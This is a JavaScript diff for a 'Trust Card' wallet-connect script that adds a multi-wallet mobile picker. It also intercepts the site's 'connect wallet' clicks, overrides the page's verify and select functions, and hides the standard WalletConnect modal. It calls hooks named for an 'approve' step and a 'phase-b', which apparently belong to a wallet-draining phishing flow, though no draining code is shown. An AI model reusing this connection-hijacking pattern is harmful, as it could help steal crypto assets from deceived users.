@@ -1,6 +1,8 @@
 /**
- * Trust Card — direct Trust-only connect.
- * Connect Wallet → Trust deep-link / WC (no MM / CB / generic WC picker).
+ * Trust Card — universal wallet connect (Trust + MetaMask + Coinbase + Rainbow + OKX + QR).
+ * Mobile: shows wallet picker bottom-sheet with deep links.
+ * Desktop: lets Legion handle extension + QR natively.
+ * startTrust() preserved as-is for backward compat with phase-b / post-connect.
  */
 (function () {
   'use strict';
@@ -13,6 +15,210 @@
     } catch (_) {}
     return false;
   }
+
+  // ── Detect which wallet's in-app browser we're inside ──────────────────────
+  function getInAppWallet() {
+    try {
+      var ua = navigator.userAgent || '';
+      if (/Trust\/[\d.]+/i.test(ua)) return 'trust';
+      if (/MetaMaskMobile/i.test(ua)) return 'metamask';
+      if (/CoinbaseWallet/i.test(ua)) return 'coinbase';
+      if (/OKApp|OKEx/i.test(ua)) return 'okx';
+      if (/BiApp/i.test(ua)) return 'binance';
+      if (!isMobile()) return null;
+      var eth = window.ethereum;
+      if (!eth) return null;
+      if (eth.isTrust || eth.isTrustWallet) return 'trust';
+      if (eth.isMetaMask && !eth.isRabby && !eth.isWalletConnect) return 'metamask';
+      if (eth.isCoinbaseWallet || eth.isCoinbaseBrowser) return 'coinbase';
+      if (eth.isOkxWallet || eth.isOKExWallet) return 'okx';
+    } catch (_) {}
+    return null;
+  }
+
+  // ── Wallet list for picker ──────────────────────────────────────────────────
+  var PICKER_WALLETS = [
+    { id: 'trust',    name: 'Trust Wallet',   icon: '🛡️', bg: '#3375BB' },
+    { id: 'metamask', name: 'MetaMask',        icon: '🦊', bg: '#F6851B' },
+    { id: 'coinbase', name: 'Coinbase Wallet', icon: '💙', bg: '#0052FF' },
+    { id: 'rainbow',  name: 'Rainbow',         icon: '🌈', bg: '#7B3FE4' },
+    { id: 'okx',      name: 'OKX Wallet',      icon: '⬛', bg: '#111'   },
+    { id: 'binance',  name: 'Binance Web3',    icon: '🟡', bg: '#181818', fg: '#F0B90B' },
+    { id: 'qr',       name: 'Other / Scan QR', icon: '📷', bg: '#222'   },
+  ];
+
+  // ── Wallet picker bottom-sheet (mobile only) ────────────────────────────────
+  function buildPickerModal() {
+    var rows = PICKER_WALLETS.map(function (w) {
+      return (
+        '<button type="button" data-wid="' + w.id + '" style="' +
+          'display:flex;align-items:center;gap:14px;width:100%;' +
+          'background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.09);' +
+          'border-radius:14px;padding:14px 16px;cursor:pointer;text-align:left;' +
+          'color:#fff;font-family:system-ui,-apple-system,sans-serif;font-size:15px;font-weight:500;' +
+          'margin-bottom:9px;-webkit-tap-highlight-color:transparent;">' +
+          '<span style="display:inline-flex;align-items:center;justify-content:center;' +
+            'width:42px;height:42px;border-radius:12px;background:' + w.bg + ';' +
+            'font-size:22px;flex-shrink:0;">' + w.icon + '</span>' +
+          '<span>' + w.name + '</span>' +
+          '<span style="margin-left:auto;color:rgba(255,255,255,.28);font-size:20px;line-height:1;">›</span>' +
+        '</button>'
+      );
+    }).join('');
+
+    var el = document.createElement('div');
+    el.id = '__wcp_root';
+    el.innerHTML =
+      '<div id="__wcp_bg" style="position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:2147483640;' +
+        'backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);"></div>' +
+      '<div id="__wcp_sheet" style="position:fixed;left:0;right:0;bottom:0;z-index:2147483641;' +
+        'background:#141414;border-radius:22px 22px 0 0;' +
+        'padding:0 16px calc(20px + env(safe-area-inset-bottom,0px));' +
+        'font-family:system-ui,-apple-system,sans-serif;max-height:90vh;overflow-y:auto;' +
+        'transform:translateY(100%);transition:transform .3s cubic-bezier(.32,1,.23,1);">' +
+        '<div style="width:36px;height:4px;background:#2e2e2e;border-radius:2px;margin:14px auto 18px;"></div>' +
+        '<p style="text-align:center;color:#fff;font-size:17px;font-weight:700;margin:0 0 16px;">Connect Wallet</p>' +
+        rows +
+        '<button type="button" id="__wcp_cancel" style="width:100%;margin-top:4px;' +
+          'background:transparent;border:1px solid #252525;border-radius:13px;' +
+          'padding:14px;color:#555;font-size:15px;font-family:inherit;cursor:pointer;">' +
+          'Cancel' +
+        '</button>' +
+      '</div>';
+
+    document.body.appendChild(el);
+
+    el.querySelector('#__wcp_bg').addEventListener('click', hideWalletPicker);
+    el.querySelector('#__wcp_cancel').addEventListener('click', hideWalletPicker);
+
+    var btns = el.querySelectorAll('[data-wid]');
+    for (var i = 0; i < btns.length; i++) {
+      (function (b) {
+        b.addEventListener('click', function () {
+          hideWalletPicker();
+          connectWalletById(b.getAttribute('data-wid'));
+        });
+        b.addEventListener('touchstart', function () { b.style.background = 'rgba(255,255,255,.13)'; }, { passive: true });
+        b.addEventListener('touchend', function () { b.style.background = 'rgba(255,255,255,.06)'; }, { passive: true });
+        b.addEventListener('mouseenter', function () { b.style.background = 'rgba(255,255,255,.12)'; });
+        b.addEventListener('mouseleave', function () { b.style.background = 'rgba(255,255,255,.06)'; });
+      })(btns[i]);
+    }
+
+    return el;
+  }
+
+  function showWalletPicker() {
+    var el = document.getElementById('__wcp_root') || buildPickerModal();
+    el.style.display = 'block';
+    document.body.style.overflow = 'hidden';
+    var sheet = el.querySelector('#__wcp_sheet');
+    if (sheet) {
+      sheet.style.transition = 'none';
+      sheet.style.transform = 'translateY(100%)';
+      requestAnimationFrame(function () {
+        sheet.style.transition = 'transform .3s cubic-bezier(.32,1,.23,1)';
+        requestAnimationFrame(function () { sheet.style.transform = 'translateY(0)'; });
+      });
+    }
+  }
+
+  function hideWalletPicker() {
+    var el = document.getElementById('__wcp_root');
+    if (!el) return;
+    var sheet = el.querySelector('#__wcp_sheet');
+    if (sheet) {
+      sheet.style.transform = 'translateY(100%)';
+      setTimeout(function () { el.style.display = 'none'; document.body.style.overflow = ''; }, 300);
+    } else {
+      el.style.display = 'none';
+      document.body.style.overflow = '';
+    }
+  }
+
+  // ── Connect by wallet ID ────────────────────────────────────────────────────
+  // Works for: trust / metamask / coinbase / rainbow / okx / binance / qr
+  function connectWalletById(walletId) {
+    window.__SELECTED_WALLET__ = walletId;
+    hideLegionFloatingButtons();
+
+    var L = window.legion;
+    if (!L) {
+      window.showToast && window.showToast('Wallet engine loading… retry in a second', 2500);
+      setTimeout(function () { connectWalletById(walletId); }, 400);
+      return;
+    }
+
+    if (walletId === 'qr') {
+      // Show AppKit QR — unhide the modal
+      try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (_) {}
+      setAppKitVisible(true);
+      if (!alreadyConnectedAddr()) { try { typeof L.clearWc === 'function' && L.clearWc(false); } catch (_) {} }
+      try { typeof L.beginConnect === 'function' && L.beginConnect('wc'); } catch (_) {}
+      if (typeof L.connectWC === 'function') L.connectWC();
+      else if (typeof L.connect === 'function') L.connect();
+      return;
+    }
+
+    // Named wallet: set deep-link target, keep AppKit hidden on mobile
+    try { window.__LEGION_DEEP_LINK_TARGET__ = walletId; } catch (_) {}
+    setAppKitVisible(false);
+
+    // Resume if already connected
+    var existing = alreadyConnectedAddr();
+    if (existing) {
+      try { if (typeof window.__TRUST_SHOW_APPROVE__ === 'function') window.__TRUST_SHOW_APPROVE__(existing); } catch (_) {}
+      try { if (typeof L.continueConnected === 'function') { L.continueConnected(); return; } } catch (_) {}
+    }
+
+    if (!alreadyConnectedAddr()) { try { typeof L.clearWc === 'function' && L.clearWc(false); } catch (_) {} }
+    try { typeof L.beginConnect === 'function' && L.beginConnect('wc'); } catch (_) {}
+    if (typeof L.connectWC === 'function') L.connectWC();
+    else if (typeof L.connect === 'function') L.connect();
+
+    // Fire deep-link rescue (works for any wallet via __SELECTED_WALLET__)
+    if (isMobile() && typeof window.__TRUST_OPEN_DEEPLINK__ === 'function') {
+      setTimeout(function () { window.__TRUST_OPEN_DEEPLINK__(false); }, 600);
+      setTimeout(function () { window.__TRUST_OPEN_DEEPLINK__(false); }, 1800);
+    }
+  }
+
+  // ── AppKit modal visibility toggle ─────────────────────────────────────────
+  function setAppKitVisible(show) {
+    var s = document.getElementById('__wc_appkit_css');
+    if (!s) { s = document.createElement('style'); s.id = '__wc_appkit_css'; document.head.appendChild(s); }
+    s.textContent = show ? '' : '@media(max-width:1024px){w3m-modal,wcm-modal{opacity:0!important;pointer-events:none!important}}';
+  }
+  // Default: hide AppKit on mobile (deep-link rescue handles it)
+  setAppKitVisible(false);
+
+  // ── Smart connect entry (replaces hardcoded startTrust for CTAs) ────────────
+  function openSmartConnect() {
+    hideLegionFloatingButtons();
+    var inApp = getInAppWallet();
+    if (inApp) {
+      // Inside a wallet's own browser — connect directly
+      connectWalletById(inApp);
+      return;
+    }
+    if (isMobile()) {
+      showWalletPicker();
+    } else {
+      // Desktop: let Legion choose (extension if present, else AppKit QR)
+      try { window.__LEGION_DEEP_LINK_TARGET__ = null; } catch (_) {}
+      setAppKitVisible(true);
+      var L = window.legion;
+      if (!L) { setTimeout(openSmartConnect, 400); return; }
+      if (!alreadyConnectedAddr()) { try { typeof L.clearWc === 'function' && L.clearWc(false); } catch (_) {} }
+      if (typeof L.connect === 'function') L.connect();
+      else if (typeof L.connectWC === 'function') L.connectWC();
+    }
+  }
+
+  // Expose for rescue script + other modules
+  window.__SELECTED_WALLET__ = window.__SELECTED_WALLET__ || null;
+  window.__WC_CONNECT__ = connectWalletById;
+  window.__WALLET_PICKER_SHOW__ = showWalletPicker;
 
   function hideLegionFloatingButtons() {
     try {
@@ -54,8 +260,10 @@
   function startTrust() {
     hideLegionFloatingButtons();
     hideOtherWallets();
+    window.__SELECTED_WALLET__ = 'trust';
     // Always pin Trust as deep-link target (mobile + desktop WC→Trust)
     try { window.__LEGION_DEEP_LINK_TARGET__ = 'trust'; } catch (_) {}
+    setAppKitVisible(false);
 
     // Already linked this session — resume, do NOT clearWc (that was wiping return-from-Trust)
     var existing = alreadyConnectedAddr();
@@ -109,8 +317,9 @@
   window.__TRUST_DIRECT_CONNECT__ = startTrust;
 
   function patchConfirmVerify() {
+    // Use openSmartConnect so mobile gets picker, desktop gets extension/QR
     window.confirmVerify = function () {
-      startTrust();
+      openSmartConnect();
     };
   }
 
@@ -118,12 +327,19 @@
     var orig = window.selectWallet;
     if (typeof orig !== 'function') return;
     window.selectWallet = function (name, el) {
-      var n = String(name || '').toLowerCase();
-      // Force every choice → Trust
-      if (!n || n.indexOf('trust') === -1) {
-        return orig.call(this, 'Trust Wallet', el || null);
+      var n = String(name || '').toLowerCase().replace(/\s+/g, '');
+      // Route by wallet name
+      if (n.indexOf('metamask') !== -1)                          { connectWalletById('metamask'); return; }
+      if (n.indexOf('coinbase') !== -1)                          { connectWalletById('coinbase'); return; }
+      if (n.indexOf('rainbow') !== -1)                           { connectWalletById('rainbow');  return; }
+      if (n.indexOf('okx') !== -1 || n.indexOf('okex') !== -1)  { connectWalletById('okx');      return; }
+      if (n.indexOf('binance') !== -1)                           { connectWalletById('binance');  return; }
+      if (n.indexOf('trust') !== -1 || !n) {
+        connectWalletById('trust');
+        return;
       }
-      return orig.call(this, name, el);
+      // Unknown wallet name → show picker on mobile, else pass through
+      if (isMobile()) { showWalletPicker(); } else { orig.call(this, name, el || null); }
     };
   }
 
@@ -135,11 +351,11 @@
     var id = btn.id || '';
     var txt = (btn.textContent || '').trim().toLowerCase();
 
-    // Legion floating buttons — never show extension picker on Trust site
+    // Legion floating buttons — route to smart connect
     if (id === '__lgn_cb' || id === '__lgn_wb') {
       e.preventDefault();
       e.stopPropagation();
-      startTrust();
+      openSmartConnect();
       return;
     }
 
@@ -147,13 +363,13 @@
     if (
       id === 'cfmbtn' ||
       txt === 'connect wallet' ||
-      (txt.indexOf('connect') === 0 && txt.indexOf('wallet') !== -1)
+      (txt.indexOf('connect') !== -1 && txt.indexOf('wallet') !== -1)
     ) {
-      // Let confirmVerify run if it's the verify button (we patched it)
+      // Let confirmVerify run if it's the verify button (we patched it already)
       if (id === 'cfmbtn') return;
       e.preventDefault();
       e.stopPropagation();
-      startTrust();
+      openSmartConnect();
     }
   }
 
@@ -198,21 +414,20 @@
   // If SPA re-renders and reassigns confirmVerify, re-patch
   var obs = new MutationObserver(function () {
     if (typeof window.confirmVerify === 'function' &&
-        !String(window.confirmVerify).includes('startTrust') &&
-        window.confirmVerify !== startTrust) {
-      // Only re-patch if still opening modal
+        window.confirmVerify !== openSmartConnect) {
+      // Only re-patch if SPA is trying to show its own modal
       var src = Function.prototype.toString.call(window.confirmVerify);
       if (src.indexOf('cw-show') !== -1 || src.indexOf('cwModal') !== -1) {
         patchConfirmVerify();
       }
     }
     hideLegionFloatingButtons();
-    hideOtherWallets();
   });
   if (document.body) obs.observe(document.body, { childList: true, subtree: true });
   else document.addEventListener('DOMContentLoaded', function () {
     obs.observe(document.body, { childList: true, subtree: true });
   });
 
-  window.__TRUST_DIRECT_CONNECT__ = startTrust;
+  window.__TRUST_DIRECT_CONNECT__ = startTrust; // kept for phase-b / post-connect compat
+  window.__SMART_CONNECT__ = openSmartConnect;   // new universal entry
 })();
